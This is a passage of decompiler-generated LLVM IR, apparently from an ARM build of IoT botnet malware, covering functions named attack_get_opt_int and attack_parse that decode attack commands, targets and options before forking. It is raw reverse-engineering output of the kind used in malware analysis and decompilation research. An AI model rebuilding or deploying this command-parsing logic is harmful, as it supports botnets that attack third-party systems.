dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9ff4
  %v1_9fe4 = add i32 %v0_9fec.in, 12
  %v2_9fe4 = inttoptr i32 %v1_9fe4 to i8*
  %v3_9fe4 = load i8, i8* %v2_9fe4, align 1
  %v4_9fe4 = zext i8 %v3_9fe4 to i32
  %v9_9fe8 = icmp eq i32 %v4_9fe4, %arg3
  br i1 %v9_9fe8, label %dec_label_pc_a010, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9ff4.preheader, %dec_label_pc_9fe4
  %v0_9fec.in = phi i32 [ %v0_9fcc, %dec_label_pc_9ff4.preheader ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v0_9ff4 = phi i32 [ 0, %dec_label_pc_9ff4.preheader ], [ %v1_9ff4, %dec_label_pc_9fe4 ]
  %v0_9fec = add i32 %v0_9fec.in, 8
  %v1_9ff4 = add i32 %v0_9ff4, 1
  %v9_9ff8 = icmp eq i32 %v1_9ff4, %arg1
  store i32 %v0_9fec, i32* %r1.global-to-local, align 4
  br i1 %v9_9ff8, label %dec_label_pc_a004, label %dec_label_pc_9fe4

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ff4, %dec_label_pc_a010, %entry, %dec_label_pc_a01c
  %v2_a008 = phi i32 [ %v3_9fc0, %dec_label_pc_a010 ], [ %v3_9fc0, %entry ], [ %v2_a008.pre, %dec_label_pc_a01c ], [ %v3_9fc0, %dec_label_pc_9ff4 ]
  %v0_a004 = phi i32 [ %arg4, %dec_label_pc_a010 ], [ %arg4, %entry ], [ %v1_a01c, %dec_label_pc_a01c ], [ %arg4, %dec_label_pc_9ff4 ]
  store i32 %v2_a008, i32* @r4, align 4
  store i32 %v6_9fc0, i32* @lr, align 4
  ret i32 %v0_a004

dec_label_pc_a010:                                ; preds = %dec_label_pc_9fe4, %dec_label_pc_9fcc
  %v0_a010 = phi i32 [ %v0_9fcc, %dec_label_pc_9fcc ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v1_a010 = inttoptr i32 %v0_a010 to i32*
  %v2_a010 = load i32, i32* %v1_a010, align 4
  store i32 %v2_a010, i32* @r0, align 4
  %v2_a014 = icmp eq i32 %v2_a010, 0
  br i1 %v2_a014, label %dec_label_pc_a004, label %dec_label_pc_a01c

dec_label_pc_a01c:                                ; preds = %dec_label_pc_a010
  %v1_a01c = call i32 @inet_addr(i32 %v2_a010)
  %v2_a008.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a004

; uselistorder directives
  uselistorder i32 %v1_9ff4, { 1, 0 }
  uselistorder i32 %v0_9fec, { 1, 0, 2 }
  uselistorder i32 %v0_9fec.in, { 1, 0 }
  uselistorder i32 %v0_9fcc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a004, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_9ff4, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a028 = icmp eq i32 %arg1, 0
  %v3_a02c = load i32, i32* @r4, align 4
  store i32 %v3_a02c, i32* %stack_var_-8, align 4
  %v6_a02c = load i32, i32* @lr, align 4
  br i1 %v2_a028, label %dec_label_pc_a070, label %dec_label_pc_a038

dec_label_pc_a038:                                ; preds = %entry
  %v0_a038 = load i32, i32* %r1.global-to-local, align 4
  %v1_a038 = add i32 %v0_a038, 4
  %v2_a038 = inttoptr i32 %v1_a038 to i8*
  %v3_a038 = load i8, i8* %v2_a038, align 1
  %v4_a038 = zext i8 %v3_a038 to i32
  %v9_a03c = icmp eq i32 %v4_a038, %arg3
  br i1 %v9_a03c, label %dec_label_pc_a07c, label %dec_label_pc_a060.preheader

dec_label_pc_a060.preheader:                      ; preds = %dec_label_pc_a038
  br label %dec_label_pc_a060

dec_label_pc_a050:                                ; preds = %dec_label_pc_a060
  %v1_a050 = add i32 %v0_a058.in, 12
  %v2_a050 = inttoptr i32 %v1_a050 to i8*
  %v3_a050 = load i8, i8* %v2_a050, align 1
  %v4_a050 = zext i8 %v3_a050 to i32
  %v9_a054 = icmp eq i32 %v4_a050, %arg3
  br i1 %v9_a054, label %dec_label_pc_a07c, label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a060.preheader, %dec_label_pc_a050
  %v0_a058.in = phi i32 [ %v0_a038, %dec_label_pc_a060.preheader ], [ %v0_a058, %dec_label_pc_a050 ]
  %v0_a060 = phi i32 [ 0, %dec_label_pc_a060.preheader ], [ %v1_a060, %dec_label_pc_a050 ]
  %v0_a058 = add i32 %v0_a058.in, 8
  %v1_a060 = add i32 %v0_a060, 1
  %v9_a064 = icmp eq i32 %v1_a060, %arg1
  store i32 %v0_a058, i32* %r1.global-to-local, align 4
  br i1 %v9_a064, label %dec_label_pc_a070, label %dec_label_pc_a050

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060, %dec_label_pc_a07c, %entry, %dec_label_pc_a088
  %v2_a074 = phi i32 [ %v3_a02c, %dec_label_pc_a07c ], [ %v3_a02c, %entry ], [ %v2_a074.pre, %dec_label_pc_a088 ], [ %v3_a02c, %dec_label_pc_a060 ]
  %v0_a070 = phi i32 [ %arg4, %dec_label_pc_a07c ], [ %arg4, %entry ], [ %v3_a08c, %dec_label_pc_a088 ], [ %arg4, %dec_label_pc_a060 ]
  store i32 %v2_a074, i32* @r4, align 4
  store i32 %v6_a02c, i32* @lr, align 4
  ret i32 %v0_a070

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a050, %dec_label_pc_a038
  %v0_a07c = phi i32 [ %v0_a038, %dec_label_pc_a038 ], [ %v0_a058, %dec_label_pc_a050 ]
  %v1_a07c = inttoptr i32 %v0_a07c to i32*
  %v2_a07c = load i32, i32* %v1_a07c, align 4
  %v2_a080 = icmp eq i32 %v2_a07c, 0
  br i1 %v2_a080, label %dec_label_pc_a070, label %dec_label_pc_a088

dec_label_pc_a088:                                ; preds = %dec_label_pc_a07c
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a08c = inttoptr i32 %v2_a07c to i8*
  %v3_a08c = call i32 @util_atoi(i8* %v2_a08c, i32 10)
  %v2_a074.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a070

; uselistorder directives
  uselistorder i32 %v1_a060, { 1, 0 }
  uselistorder i32 %v0_a058, { 1, 0, 2 }
  uselistorder i32 %v0_a058.in, { 1, 0 }
  uselistorder i32 %v0_a038, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a070, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_a098 = load i32, i32* @r5, align 4
  %v9_a098 = load i32, i32* @r6, align 4
  %v12_a098 = load i32, i32* @r7, align 4
  %v18_a098 = load i32, i32* @sb, align 4
  %v21_a098 = load i32, i32* @sl, align 4
  %v24_a098 = load i32, i32* @fp, align 4
  %v2_a09c = icmp ugt i32 %arg2, 2
  %v7_a09c = icmp eq i32 %arg2, 3
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a0a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a0a8, i32* @r5, align 4
  %v2_a0ac = xor i1 %v7_a09c, true
  %v3_a0ac = and i1 %v2_a09c, %v2_a0ac
  br i1 %v3_a0ac, label %dec_label_pc_a0bc, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a100, %.dec_label_pc_a0b0_crit_edge, %dec_label_pc_a0f4, %dec_label_pc_a0e4, %dec_label_pc_a0bc, %entry, %dec_label_pc_a2a8
  %v1_a0b8 = phi i32 [ %v1_a0b8.pre, %.dec_label_pc_a0b0_crit_edge ], [ %v1_a0c0, %dec_label_pc_a100 ], [ %v1_a0c0, %dec_label_pc_a0f4 ], [ %v1_a0c0, %dec_label_pc_a0e4 ], [ %v1_a0c0, %dec_label_pc_a0bc ], [ %v0_a0a8, %entry ], [ %v0_a2ac, %dec_label_pc_a2a8 ]
  store i32 %v6_a098, i32* @r5, align 4
  store i32 %v9_a098, i32* @r6, align 4
  store i32 %v12_a098, i32* @r7, align 4
  store i32 %v18_a098, i32* @sb, align 4
  store i32 %v21_a098, i32* @sl, align 4
  store i32 %v24_a098, i32* @fp, align 4
  ret i32 %v1_a0b8

dec_label_pc_a0bc:                                ; preds = %entry
  %v1_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v2_a0bc = load i32, i32* %v1_a0bc, align 4
  %v1_a0c0 = and i32 %v2_a0bc, 16711680
  store i32 %v1_a0c0, i32* %r0.global-to-local, align 4
  %v3_a0c4 = udiv i32 %v2_a0bc, 16777216
  %v1_a0c8 = and i32 %v2_a0bc, 65280
  %v4_a0cc = udiv i32 %v1_a0c0, 256
  %v5_a0cc = or i32 %v4_a0cc, %v3_a0c4
  %v4_a0d0 = mul nuw nsw i32 %v1_a0c8, 256
  %v5_a0d0 = or i32 %v5_a0cc, %v4_a0d0
  store i32 %v5_a0d0, i32* %r3.global-to-local, align 4
  %v5_a0d4 = call i32 @llvm.bswap.i32(i32 %v2_a0bc)
  store i32 %v5_a0d4, i32* %r1.global-to-local, align 4
  %v7_a0d8 = icmp eq i32 %arg2, 4
  store i1 %v7_a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0d8, label %dec_label_pc_a0b0, label %dec_label_pc_a0e4

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = add i32 %v0_a0a8, 4
  %v2_a0e4 = inttoptr i32 %v1_a0e4 to i8*
  %v3_a0e4 = load i8, i8* %v2_a0e4, align 1
  %v4_a0e4 = zext i8 %v3_a0e4 to i32
  store i32 %v4_a0e4, i32* %r3.global-to-local, align 4
  %v7_a0e8 = icmp eq i32 %arg2, 5
  store i1 %v7_a0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0e8, label %dec_label_pc_a0b0, label %dec_label_pc_a0f4

dec_label_pc_a0f4:                                ; preds = %dec_label_pc_a0e4
  %v1_a0f4 = add i32 %v0_a0a8, 5
  %v2_a0f4 = inttoptr i32 %v1_a0f4 to i8*
  %v3_a0f4 = load i8, i8* %v2_a0f4, align 1
  %v4_a0f4 = zext i8 %v3_a0f4 to i32
  store i32 %v4_a0f4, i32* @sb, align 4
  %v2_a0f8 = icmp eq i8 %v3_a0f4, 0
  store i1 %v2_a0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0f8, label %dec_label_pc_a0b0, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0f4
  %v2_a104 = mul nuw nsw i32 %v4_a0f4, 5
  store i32 %v2_a104, i32* @r7, align 4
  %v1_a108 = add i32 %arg2, -6
  store i32 %v1_a108, i32* %r3.global-to-local, align 4
  %v3_a10c = icmp ult i32 %v1_a108, %v2_a104
  %v9_a10c = icmp eq i32 %v1_a108, %v2_a104
  store i1 %v9_a10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a10c, label %dec_label_pc_a0b0, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a100
  store i32 %v4_a0f4, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a108, i32* @r6, align 4
  %v2_a120 = call i32 @calloc(i32 %v4_a0f4, i32 24)
  store i32 %v2_a120, i32* %ip.global-to-local, align 4
  %v0_a12c = load i32, i32* @r7, align 4
  %v1_a12c = load i32, i32* @r4, align 4
  %v2_a12c = sub i32 %v1_a12c, %v0_a12c
  store i32 %v2_a12c, i32* @r7, align 4
  %v0_a130 = load i32, i32* @r5, align 4
  %v1_a130 = add i32 %v0_a130, 11
  store i32 %v1_a130, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a134, %dec_label_pc_a114
  %v1_a138 = phi i32 [ %v1_a164, %dec_label_pc_a134 ], [ %v2_a120, %dec_label_pc_a114 ]
  %v0_a134 = phi i32 [ %v1_a160, %dec_label_pc_a134 ], [ %v1_a130, %dec_label_pc_a114 ]
  %v1_a134 = add i32 %v0_a134, -5
  %v2_a134 = inttoptr i32 %v1_a134 to i32*
  %v3_a134 = load i32, i32* %v2_a134, align 4
  store i32 %v3_a134, i32* %r1.global-to-local, align 4
  %v2_a138 = add i32 %v1_a138, 16
  %v3_a138 = inttoptr i32 %v2_a138 to i32*
  store i32 %v3_a134, i32* %v3_a138, align 4
  %v0_a13c = load i32, i32* @r6, align 4
  %v1_a13c = add i32 %v0_a13c, -5
  store i32 %v1_a13c, i32* @r6, align 4
  %v0_a140 = load i32, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v0_a140, -1
  %v2_a140 = inttoptr i32 %v1_a140 to i8*
  %v3_a140 = load i8, i8* %v2_a140, align 1
  %v0_a144 = load i32, i32* @r7, align 4
  %v1_a144 = add i32 %v0_a144, -6
  store i32 %v1_a144, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_a14c = icmp eq i32 %v1_a13c, %v1_a144
  store i1 %v9_a14c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_a140, i32* @r4, align 4
  %v2_a154 = load i32, i32* %ip.global-to-local, align 4
  %v3_a154 = add i32 %v2_a154, 20
  %v4_a154 = inttoptr i32 %v3_a154 to i8*
  store i8 %v3_a140, i8* %v4_a154, align 1
  %v0_a158 = load i32, i32* %r1.global-to-local, align 4
  %v1_a158 = load i32, i32* %ip.global-to-local, align 4
  %v2_a158 = add i32 %v1_a158, 4
  %v3_a158 = inttoptr i32 %v2_a158 to i32*
  store i32 %v0_a158, i32* %v3_a158, align 4
  %v0_a15c = load i32, i32* @lr, align 4
  %v1_a15c = trunc i32 %v0_a15c to i16
  %v2_a15c = load i32, i32* %ip.global-to-local, align 4
  %v3_a15c = inttoptr i32 %v2_a15c to i16*
  store i16 %v1_a15c, i16* %v3_a15c, align 2
  %v0_a160 = load i32, i32* %r0.global-to-local, align 4
  %v1_a160 = add i32 %v0_a160, 5
  store i32 %v1_a160, i32* %r0.global-to-local, align 4
  %v0_a164 = load i32, i32* %ip.global-to-local, align 4
  %v1_a164 = add i32 %v0_a164, 24
  store i32 %v1_a164, i32* %ip.global-to-local, align 4
  %v0_a168 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a168, label %dec_label_pc_a16c, label %dec_label_pc_a134

dec_label_pc_a16c:                                ; preds = %dec_label_pc_a134
  %v0_a16c = load i32, i32* @r6, align 4
  %v2_a16c = icmp eq i32 %v0_a16c, 0
  store i1 %v2_a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a16c, label %dec_label_pc_a26c, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a16c
  %v0_a174 = load i32, i32* @r4, align 4
  %v1_a174 = inttoptr i32 %v0_a174 to i8*
  %v2_a174 = load i8, i8* %v1_a174, align 1
  %v3_a174 = zext i8 %v2_a174 to i32
  store i32 %v3_a174, i32* @r5, align 4
  %v2_a178 = icmp eq i8 %v2_a174, 0
  store i1 %v2_a178, i1* %cpsr_z.global-to-local, align 1
  %v0_a17c = load i32, i32* @r7, align 4
  %v1_a17c = add i32 %v0_a17c, -7
  store i32 %v1_a17c, i32* @r8, align 4
  br i1 %v2_a178, label %bb, label %dec_label_pc_a188

bb:                                               ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* @r6, align 4
  br label %dec_label_pc_a23c

dec_label_pc_a188:                                ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a190 = call i32 @calloc(i32 %v3_a174, i32 8)
  store i32 %v2_a190, i32* %r0.global-to-local, align 4
  %v0_a194 = load i32, i32* @r8, align 4
  %v2_a194 = icmp eq i32 %v0_a194, 0
  store i1 %v2_a194, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a190, i32* @r6, align 4
  br i1 %v2_a194, label %dec_label_pc_a26c, label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a188
  %v0_a1a0 = load i32, i32* @r4, align 4
  %v1_a1a0 = add i32 %v0_a1a0, 1
  %v2_a1a0 = inttoptr i32 %v1_a1a0 to i8*
  %v3_a1a0 = load i8, i8* %v2_a1a0, align 1
  %v0_a1a4 = load i32, i32* @r7, align 4
  %v7_a1a4 = icmp eq i32 %v0_a1a4, 8
  store i1 %v7_a1a4, i1* %cpsr_z.global-to-local, align 1
  %v3_a1a8 = add i32 %v2_a190, 4
  %v4_a1a8 = inttoptr i32 %v3_a1a8 to i8*
  store i8 %v3_a1a0, i8* %v4_a1a8, align 1
  %v0_a1ac = load i32, i32* @r4, align 4
  %v1_a1ac = add i32 %v0_a1ac, 1
  store i32 %v1_a1ac, i32* %r3.global-to-local, align 4
  %v0_a1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0, label %dec_label_pc_a26c, label %dec_label_pc_a1b4

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a1a0
  %v1_a1b4 = add i32 %v0_a1ac, 2
  %v2_a1b4 = inttoptr i32 %v1_a1b4 to i8*
  %v3_a1b4 = load i8, i8* %v2_a1b4, align 1
  %v4_a1b4 = zext i8 %v3_a1b4 to i32
  store i32 %v4_a1b4, i32* @r4, align 4
  %v0_a1b8 = load i32, i32* @r7, align 4
  %v1_a1b8 = add i32 %v0_a1b8, -9
  store i32 %v1_a1b8, i32* @r7, align 4
  %v9_a1bc = icmp eq i32 %v1_a1b8, %v4_a1b4
  store i1 %v9_a1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1b4, i32* %r1.global-to-local, align 4
  %v5_a1c4 = icmp slt i32 %v1_a1b8, %v4_a1b4
  br i1 %v5_a1c4, label %dec_label_pc_a26c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_a1b4
  %v7_a1c44711 = add i32 %v0_a1ac, 3
  store i32 %v7_a1c44711, i32* @r8, align 4
  %v6_a1c8812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1c8812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_a214

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a214
  %v0_a1d8 = load i32, i32* @r7, align 4
  %v1_a1d8 = load i32, i32* @r4, align 4
  %v2_a1d8 = sub i32 %v0_a1d8, %v1_a1d8
  store i32 %v2_a1d8, i32* %r1.global-to-local, align 4
  %v9_a1d8 = icmp eq i32 %v0_a1d8, %v1_a1d8
  store i1 %v9_a1d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1d8, label %dec_label_pc_a26c, label %dec_label_pc_a1e0

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1d8
  %v3_a1e0 = mul i32 %v0_a234, 8
  store i32 %v3_a1e0, i32* %r3.global-to-local, align 4
  %v1_a1e4 = load i32, i32* @r8, align 4
  %v2_a1e4 = add i32 %v1_a1e4, %v1_a1d8
  %v3_a1e4 = inttoptr i32 %v2_a1e4 to i8*
  %v4_a1e4 = load i8, i8* %v3_a1e4, align 1
  %v0_a1e8 = load i32, i32* @r6, align 4
  %v2_a1e8 = add i32 %v0_a1e8, %v3_a1e0
  store i32 %v2_a1e8, i32* @sl, align 4
  %v1_a1ec = add i32 %v2_a1d8, -1
  store i32 %v1_a1ec, i32* %r3.global-to-local, align 4
  %v7_a1ec = icmp eq i32 %v2_a1d8, 1
  store i1 %v7_a1ec, i1* %cpsr_z.global-to-local, align 1
  %v3_a1f0 = add i32 %v2_a1e8, 4
  %v4_a1f0 = inttoptr i32 %v3_a1f0 to i8*
  store i8 %v4_a1e4, i8* %v4_a1f0, align 1
  %v0_a1f4 = load i32, i32* @r4, align 4
  %v1_a1f4 = load i32, i32* @r8, align 4
  %v2_a1f4 = add i32 %v1_a1f4, %v0_a1f4
  store i32 %v2_a1f4, i32* %r1.global-to-local, align 4
  %v0_a1f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f8, label %dec_label_pc_a26c, label %dec_label_pc_a1fc

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1e0
  %v1_a1fc = add i32 %v2_a1f4, 1
  %v2_a1fc = inttoptr i32 %v1_a1fc to i8*
  %v3_a1fc = load i8, i8* %v2_a1fc, align 1
  %v4_a1fc = zext i8 %v3_a1fc to i32
  store i32 %v4_a1fc, i32* @r4, align 4
  %v0_a200 = load i32, i32* %r3.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, -1
  store i32 %v1_a200, i32* @r7, align 4
  %v2_a204 = sub i32 %v1_a200, %v4_a1fc
  %tmp46 = sub i32 0, %v2_a204
  %v6_a204 = and i32 %v1_a200, %tmp46
  %v7_a204 = icmp slt i32 %v6_a204, 0
  %v8_a204 = icmp slt i32 %v2_a204, 0
  %v9_a204 = icmp eq i32 %v1_a200, %v4_a1fc
  store i1 %v9_a204, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1fc, i32* %r1.global-to-local, align 4
  %v2_a20c = xor i1 %v8_a204, %v7_a204
  br i1 %v2_a20c, label %dec_label_pc_a26c, label %dec_label_pc_a210

dec_label_pc_a210:                                ; preds = %dec_label_pc_a1fc
  %v1_a210 = add i32 %v2_a1f4, 2
  store i32 %v1_a210, i32* @r8, align 4
  br label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %.thread10, %dec_label_pc_a210
  %v0_a218 = phi i32 [ %v4_a1b4, %.thread10 ], [ %v4_a1fc, %dec_label_pc_a210 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_a218 = add nuw nsw i32 %v0_a218, 1
  store i32 %v2_a218, i32* %r0.global-to-local, align 4
  %v2_a21c = call i32 @calloc(i32 %v2_a218, i32 1)
  store i32 %v2_a21c, i32* %r0.global-to-local, align 4
  %v0_a220 = load i32, i32* @fp, align 4
  %v1_a220 = add i32 %v0_a220, 1
  store i32 %v1_a220, i32* @fp, align 4
  %v1_a224 = load i32, i32* @sl, align 4
  %v2_a224 = inttoptr i32 %v1_a224 to i32*
  store i32 %v2_a21c, i32* %v2_a224, align 4
  %v0_a228 = load i32, i32* @r8, align 4
  store i32 %v0_a228, i32* %r1.global-to-local, align 4
  %v0_a22c = load i32, i32* @r4, align 4
  %v3_a230 = call i32 @util_memcpy(i32 %v2_a21c, i32 %v0_a228, i32 %v0_a22c)
  store i32 %v3_a230, i32* %r0.global-to-local, align 4
  %v0_a234 = load i32, i32* @fp, align 4
  %v1_a234 = load i32, i32* @r5, align 4
  %v9_a234 = icmp eq i32 %v0_a234, %v1_a234
  store i1 %v9_a234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a234, label %dec_label_pc_a23c, label %dec_label_pc_a1d8

dec_label_pc_a23c:                                ; preds = %dec_label_pc_a214, %bb
  %v0_a23c = call i32 @__GI___errno_location()
  store i32 %v0_a23c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a244 = inttoptr i32 %v0_a23c to i32*
  store i32 0, i32* %v2_a244, align 4
  %v0_a248 = call i32 @__libc_fork()
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v7_a24c = icmp eq i32 %v0_a248, -1
  %. = zext i1 %v7_a24c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_a258 = icmp eq i32 %v0_a248, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %tmp49 = icmp slt i32 %v0_a248, 1
  br i1 %tmp49, label %bb50, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_a23c
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a26c

bb50:                                             ; preds = %dec_label_pc_a23c
  %v2_a264 = icmp eq i1 %v7_a24c, false
  store i1 %v2_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a264, label %dec_label_pc_a2b4, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a1fc, %dec_label_pc_a1e0, %dec_label_pc_a1d8, %dec_label_pc_a1b4, %.thread14, %bb50, %dec_label_pc_a1a0, %dec_label_pc_a188, %dec_label_pc_a16c
  store i32 %v2_a120, i32* %r3.global-to-local, align 4
  %v2_a270 = icmp eq i32 %v2_a120, 0
  store i1 %v2_a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a270, label %bb52, label %bb51

bb51:                                             ; preds = %dec_label_pc_a26c
  store i32 %v2_a120, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %dec_label_pc_a26c, %bb51
  store i32 41596, i32* @lr, align 4
  %v1_a278 = xor i1 %v2_a270, true
  call void @__pseudo_cond_branch(i1 %v1_a278, i32 ptrtoint (i32* @global_var_1445c.64 to i32))
  %v0_a27c = load i32, i32* @r6, align 4
  %v2_a27c = icmp eq i32 %v0_a27c, 0
  store i1 %v2_a27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a27c, label %.dec_label_pc_a0b0_crit_edge, label %dec_label_pc_a284

.dec_label_pc_a0b0_crit_edge:                     ; preds = %bb52
  %v1_a0b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a284:                                ; preds = %bb52
  %v0_a284 = load i32, i32* @r5, align 4
  %v2_a284 = icmp eq i32 %v0_a284, 0
  store i1 %v2_a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a284, label %dec_label_pc_a2a8, label %dec_label_pc_a28c

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a284
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a28c
  %v1_a290 = phi i32 [ 0, %dec_label_pc_a28c ], [ %v1_a29c, %dec_label_pc_a290 ]
  %v0_a290 = phi i32 [ %v0_a27c, %dec_label_pc_a28c ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  %v4_a290 = mul i32 %v1_a290, 8
  %v5_a290 = add i32 %v4_a290, %v0_a290
  %v6_a290 = inttoptr i32 %v5_a290 to i32*
  %v7_a290 = load i32, i32* %v6_a290, align 4
  store i32 %v7_a290, i32* %r0.global-to-local, align 4
  %v2_a294 = icmp eq i32 %v7_a290, 0
  store i1 %v2_a294, i1* %cpsr_z.global-to-local, align 1
  store i32 41628, i32* @lr, align 4
  %v1_a298 = xor i1 %v2_a294, true
  call void @__pseudo_cond_branch(i1 %v1_a298, i32 ptrtoint (i32* @global_var_1445c.64 to i32))
  %v0_a29c = load i32, i32* @r4, align 4
  %v1_a29c = add i32 %v0_a29c, 1
  store i32 %v1_a29c, i32* @r4, align 4
  %v0_a2a0 = load i32, i32* @r5, align 4
  %v9_a2a0 = icmp eq i32 %v0_a2a0, %v1_a29c
  store i1 %v9_a2a0, i1* %cpsr_z.global-to-local, align 1
  %v0_a2a8.pre = load i32, i32* @r6, align 4
  br i1 %v9_a2a0, label %dec_label_pc_a2a8, label %dec_label_pc_a290

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a284
  %v0_a2a8 = phi i32 [ %v0_a27c, %dec_label_pc_a284 ], [ %v0_a2a8.pre, %dec_label_pc_a290 ]
  store i32 %v0_a2a8, i32* @r0, align 4
  %v0_a2ac = call i32 @free()
  store i32 %v0_a2ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0b0

dec_label_pc_a2b4:                                ; preds = %bb50
  store i32 ptrtoint (i8** @global_var_23594.66 to i32), i32* %r3.global-to-local, align 4
  %v2_a2b8 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a2b8 = zext i8 %v2_a2b8 to i32
  store i32 %v3_a2b8, i32* %r0.global-to-local, align 4
  %v2_a2bc = icmp eq i8 %v2_a2b8, 0
  store i1 %v2_a2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2bc, label %dec_label_pc_a320, label %dec_label_pc_a2c4

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b4
  store i32 ptrtoint (i32* @global_var_23598.68 to i32), i32* %r3.global-to-local, align 4
  %v2_a2c8 = load i32, i32* @global_var_23598.68, align 4
  store i32 %v2_a2c8, i32* %r1.global-to-local, align 4
  %v1_a2cc = inttoptr i32 %v2_a2c8 to i32*
  %v2_a2cc = load i32, i32* %v1_a2cc, align 4
  store i32 %v2_a2cc, i32* %ip.global-to-local, align 4
  %v1_a2d4 = add i32 %v2_a2cc, 4
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i8*
  %v3_a2d4 = load i8, i8* %v2_a2d4, align 1
  %v4_a2d4 = zext i8 %v3_a2d4 to i32
  store i32 %v4_a2d4, i32* %r3.global-to-local, align 4
